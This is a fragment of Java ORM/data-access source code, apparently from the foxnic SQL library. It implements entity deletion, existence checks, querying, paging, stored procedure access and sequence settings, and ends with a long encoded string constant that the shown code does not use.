	public int deleteEntities(Object sample)
	{
		if(sample==null) return 0;
		return this.deleteEntities(sample, getEntityTableName(sample.getClass()));
	}

	/**
	 * 根据 sample 中的已有信息从数据库删除对应的实体集
	 *
	 * @param sample 查询样例
	 * @param table  数据表
	 * @return 删除的行数
	 */
	public int deleteEntities(Object sample,String table)
	{
		if(sample==null) return 0;

		List<String> fields=EntityUtils.getEntityFields(sample.getClass(),this,table);
		if(fields.size()==0) return 0;
		Delete  delete = new Delete(table);
		delete.setSQLDialect(this.getSQLDialect());
		Object value = null;
		for (String field : fields) {
			value=BeanUtil.getFieldValue(sample, field);
			if(value!=null) {
				delete.where().and(field+" = ? ",value);
			}
		}
		if(delete.where().isEmpty()) {
			throw new IllegalArgumentException("未指定查询条件");
		}
		int i=this.execute(delete);
		return i;
	}

	@Override
	public int deleteEntities(Class type, ConditionExpr ce) {

//		List<Entity> list = null;
//		if (this.getDataCacheManager()!=null && this.getDataCacheManager().isSupportCache(type)) {
//			//此处需要考虑性能问题
//			list=this.queryEntities(type,ce);
//		}

		int i=deleteEntities(type, getEntityTableName(type), ce);

//		if(i>0 && list!=null) {
//			this.getDataCacheManager().invalidateAccurateCache(list);
//			this.getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.DELETE,);
//		}
		return i;
	}


	@Override
	public int deleteEntities(Class type, String table,ConditionExpr ce) {
		List<Entity> list = null;
		if (this.getDataCacheManager()!=null && this.getDataCacheManager().isSupportAccurateCache(type)) {
			//此处需要考虑性能问题
			Expr expr=new Expr("select * from "+table);
			ce.startWithWhere();
			expr.append(ce.getListParameterSQL(),ce.getListParameters());
			list=this.queryEntities(type,ce);
		}

		Expr expr=new Expr("delete from "+table);
		ce.startWithWhere();
		expr.append(ce);

		int i=this.execute(expr);
		if(i>0 && list!=null) {
//			this.getDataCacheManager().invalidateAccurateCache(list);
			this.getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.DELETE,table,list,null);
		}
		return i;
	}


	/**
	 * 删除实体，通过注解识别表名
	 *
	 * @param entity 实体
	 * @return 是否成功
	 */
	public  boolean deleteEntity(Object entity) {
		if(entity==null) return false;
		return this.deleteEntity(entity, getEntityTableName(entity.getClass()));
	}

	/**
	 * 删除实体
	 *
	 * @param entity 实体
	 * @param table  数据表
	 * @return 是否成功
	 */
	public  boolean deleteEntity(Object entity,String table)
	{
		if(entity==null) return false;

		Object toInvalidEntity=null;
		if(this.isCacheSupported(entity)) {
			toInvalidEntity=this.queryEntity(entity,true);
		}

		List<String> fields=EntityUtils.getEntityFields(entity.getClass(),this,table);
		if(fields.size()==0) return false;
		DBTableMeta tm= this.getTableMeta(table);
		Delete  delete = new Delete(table);
		delete.setSQLDialect(this.getSQLDialect());
		Object value = null;
		for (String field : fields) {
			value=BeanUtil.getFieldValue(entity, field);
			if(tm.isPK(field)) {
				if(value==null) {
					throw new IllegalArgumentException("缺少主键["+table+"]值");
				}
				delete.where().and(field+" = ? ",value);
			}
		}
		if(delete.where().isEmpty()) {
			String[] pknames=BeanUtil.getFieldValueArray(tm.getPKColumns(), "column", String.class);
			throw new IllegalArgumentException("未指定主键值:"+ArrayUtil.join(pknames));
		}
		int i=this.execute(delete);
		boolean suc=i==1;
		if(suc && this.isCacheSupported(entity)) {
			this.getDataCacheManager().dispatchJoinCacheInvalidEvent(CacheInvalidEventType.DELETE,this.getDataCacheManager(),table,(Entity)toInvalidEntity,null);
		}
		return suc;
	}

	/**
	 * 实体对象是否存已经在数据表,以主键作为判断依据
	 *
	 * @param pojo  数据对象
	 * @param table 数据表
	 * @return 是否存在
	 */
	public boolean isEntityExists(Object pojo,String table)
	{
		if(pojo==null) return false;

		List<String> fields=EntityUtils.getEntityFields(pojo.getClass(),this,table);
		if(fields.size()==0) return false;
		DBTableMeta tm= this.getTableMeta(table);
		Select  select = new Select(table);
		select.select("1");
		select.setSQLDialect(this.getSQLDialect());
		Object value = null;
		for (String field : fields) {
			value=BeanUtil.getFieldValue(pojo, field);
			if(tm.isPK(field)) {
				if(value==null) {
					throw new IllegalArgumentException("缺少主键["+table+"]值");
				}
				select.where().and(field+" = ? ",value);
			}
		}

		//校验查询条件
		if(select.where().isEmpty()) {
			String[] pknames=BeanUtil.getFieldValueArray(tm.getPKColumns(), "column", String.class);
			throw new IllegalArgumentException("未指定主键值:"+ArrayUtil.join(pknames));
		}

		Rcd r=this.queryRecord(select);
		return r!=null;
	}

	private  String getEntityTableName(Class type) {
		String table=com.github.foxnic.sql.entity.EntityUtil.getAnnotationTable(type);
		if(table==null) {
			throw new RuntimeException("实体类 "+type.getName()+" 未通过 MyBatisPlus 注解或 JPA 注解标记表名");
		}
		return table;
	}


//	@Override
//	public <T> T queryEntity(T sample) {
//		if(sample==null) return null;
//		return this.queryEntity(sample,getEntityTableName(sample.getClass()));
//	}



//	@Override
//	public <T> T queryEntity(T sample, String table) {
//		if(sample==null) return null;
//		ConditionExpr ce=SQLBuilder.buildConditionExpr(sample, table, this);
//		return (T)queryEntity((Class<T>)sample.getClass(), table,ce);
//	}


//	@Override
//	public <T> T queryEntity(Class<T> type, Object id) {
//		return this.queryEntity(type,this.getEntityTableName(type),id);
//	}


//	@Override
//	public <T> T queryEntity(Class<T> type, String table, Object id) {
//		DBTableMeta tm=this.getTableMeta(table);
//		if(tm==null) {
//			throw new SQLValidateException("数据表 "+table+" 不存在");
//		}
//		if(tm.getPKColumnCount()!=1) {
//			throw new SQLValidateException("数据表 "+table+" 主键数量不符合要求，要求1个，实际"+tm.getPKColumnCount()+"个");
//		}
//		String field=tm.getPKColumns().get(0).getColumn();
//		ConditionExpr ce=new ConditionExpr();
//		ce.and(field+" = ?", id);
//		//
//		return queryEntity(type, table,ce);
//	}


//	@Override
//	public <T> T queryEntity(Class<T> type, ConditionExpr ce) {
//		return (T)this.queryEntity(type, this.getEntityTableName(type), ce);
//	}


//	@Override
//	public <T> T queryEntity(Class<T> type, String table, ConditionExpr ce) {
//		ce.startWithWhere();
//		Rcd r=this.queryRecord("select * from "+table+" "+ce.getListParameterSQL(),ce.getListParameters());
//		if(r==null) return null;
//		return (T)r.toEntity(type);
//	}

//	@Override
//	public <T> T queryEntity(Class<T> type, String condition, Object... params) {
//		return queryEntity(type, getEntityTableName(type), new ConditionExpr(condition,params));
//	}



	/**
	 * @param sql 条件表达式(ConditionExpr)或完整的 select(Expr) 语句
	 * */
	@Override
	public <T> List<T> queryEntities(Class<T> entityType, SQL sql) {
		SQL finalSQL=sql;
		if(sql instanceof ConditionExpr) {
			ConditionExpr ce=(ConditionExpr)sql;
			ce.startWithWhere();
			finalSQL=new Expr("select * from "+getEntityTableName(entityType)+" t "+ce.getListParameterSQL(),sql.getListParameters());
		}
		return this.query(finalSQL).toEntityList(entityType);
	}

//	@Override
//	public <T> T queryEntity(Class<T> type, String table, String condition, Object... params) {
//		return queryEntity(type, table, new ConditionExpr(condition,params));
//	}

	@Override
	public <T> List<T> queryEntities(T sample) {
		if(sample==null) return new ArrayList<T>();
		return queryEntities(sample,getEntityTableName(sample.getClass()));
	}


	private <T> List<T> queryEntities(T sample, String table) {
		if(sample==null) return new ArrayList<T>();
		ConditionExpr ce=SQLBuilder.buildConditionExpr(sample, table, this);
		ce.startWithWhere();
		Expr expr=new Expr("select * from "+table+" t "+ce.getListParameterSQL(),ce.getListParameters());
		return this.queryEntities((Class<T>)sample.getClass(),expr);
	}

	@Override
	public <T> PagedList<T> queryPagedEntities(T sample, int pageSize, int pageIndex) {
		if(sample==null) return new PagedList<T>(new ArrayList<T>(),0,0,0,0);
		return queryPagedEntities(sample, getEntityTableName(sample.getClass()), pageSize, pageIndex);
	}


	@Override
	public <T> PagedList<T> queryPagedEntities(T sample, String table, int pageSize, int pageIndex) {
		if(sample==null) return new PagedList<T>(new ArrayList<T>(),0,0,0,0);
		ConditionExpr ce=SQLBuilder.buildConditionExpr(sample, table, this);
		ce.startWithWhere();
		RcdSet rs=this.queryPage("select * from "+table+" t "+ce.getListParameterSQL(),pageSize,pageIndex,ce.getListParameters());
		return new PagedList<T>((List<T>)rs.toEntityList(sample.getClass()),rs.getPageSize(),rs.getPageIndex(),rs.getPageCount(),rs.getTotalRowCount());
	}

//	@Override
//	public <T> List<T> queryEntities(Class<T> type, ConditionExpr ce) {
//		return queryEntities(type, getEntityTableName(type), ce);
//	}

	public <T> PagedList<T> queryPagedEntities(Class<T> entityType,int pageSize, int pageIndex, SQL sql){
		SQL finalSQL=sql;
		if(sql instanceof ConditionExpr) {
			ConditionExpr ce=(ConditionExpr)sql;
			String table=this.getEntityTableName(entityType);
			DBTableMeta tm=this.getTableMeta(table);
			DBColumnMeta deleted=tm.getColumn(this.getDBTreaty().getDeletedField());
			if(deleted!=null) {
				Object falseValue=this.getDBTreaty().getFalseValue();
				ce.and(deleted.getColumn() + "=?", falseValue);
			}
			DBColumnMeta tenantId=tm.getColumn(this.getDBTreaty().getTenantIdField());
			if(tenantId!=null && this.getDBTreaty().getActivedTenantId()!=null) {
				ce.and(tenantId.getColumn()+"=?",this.getDBTreaty().getActivedTenantId());
			}
			ce.startWithWhere();
			finalSQL=new Expr("select * from "+getEntityTableName(entityType)+" t "+ce.getListParameterSQL(),sql.getListParameters());
		}
		return this.queryPage(finalSQL,pageSize,pageIndex).toPagedEntityList(entityType);
	}

//	@Override
//	public <T> List<T> queryEntities(Class<T> type, String table, ConditionExpr ce) {
//		ce.startWithWhere();
//		RcdSet rs=this.query("select * from "+table+" "+ce.getListParameterSQL(),ce.getListParameters());
//		return (List<T>)rs.toEntityList(type);
//	}

//	@Override
//	public <T> List<T> queryEntities(Class<T> type, String condition, Object... params) {
//		return queryEntities(type,new ConditionExpr(condition,params));
//	}

//	@Override
//	public <T> List<T> queryEntities(Class<T> type, String table, String condition, Object... params) {
//		return queryEntities(type,table,new ConditionExpr(condition,params));
//	}

//	@Override
//	public <T> PagedList<T> queryPagedEntities(Class<T> type, int pageSize, int pageIndex, ConditionExpr ce) {
//		return queryPagedEntities(type,getEntityTableName(type) ,pageSize, pageIndex, ce);
//	}

//	@Override
//	public <T> PagedList<T> queryPagedEntities(Class<T> type, String table, int pageSize, int pageIndex,ConditionExpr ce) {
//		ce.startWithWhere();
//		RcdSet rs=this.queryPage("select * from "+table+" "+ce.getListParameterSQL(),pageSize,pageIndex,ce.getListParameters());
//		return new PagedList<T>((List<T>)rs.toEntityList(type),rs.getMetaData(),rs.getPageSize(),rs.getPageIndex(),rs.getPageCount(),rs.getTotalRowCount());
//	}

//	@Override
//	public <T> PagedList<T> queryPagedEntities(Class<T> type, int pageSize, int pageIndex, String condition,Object... params) {
//		return queryPagedEntities(type, getEntityTableName(type), pageSize, pageIndex, new ConditionExpr(condition,params));
//	}

//	@Override
//	public <T> PagedList<T> queryPagedEntities(Class<T> type, String table, int pageSize, int pageIndex,String condition, Object... params) {
//		return queryPagedEntities(type, table, pageSize, pageIndex, new ConditionExpr(condition,params));
//	}

	@Override
	public StoredProcedure getStoredProcedure(String name) {
		StoredProcedure p = new StoredProcedure(this.getDataSource(), name);
		return p;
	}

	@Override
	public <T> StoredFunction<T> getStoredFunction(String name,Class<T> returnType) {
		StoredFunction p = new StoredFunction(this.getDataSource(), name,returnType);
		return p;
	}

	public DBSequence getSequence(String id) {
		return new DBSequence(this,id,this.sequenceTable,this.sequenceProcedure);
	}

	private String sequenceTable="SYS_SEQUENCE";
	private String sequenceProcedure ="NEXT_VAL";

	/**
	 * @return 返回存储序列数据的表
	 */
	public String getSequenceTable() {
		return sequenceTable;
	}

	/**
	 * @param sequenceTable 设置存储序列数据的表
	 */
	public void setSequenceTable(String sequenceTable) {
		this.sequenceTable = sequenceTable;
	}

	/**
	 * @return 返回取得序列的存储过程
	 */
	public String getSequenceProcedure() {
		return sequenceProcedure;
	}

	/**
	 * @param sequenceProcedure 设置取得序列的存储过程
	 */
	public void setSequenceProcedure(String sequenceProcedure) {
		this.sequenceProcedure = sequenceProcedure;
	}

	private static final String CXNST = "NvN7<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";
}
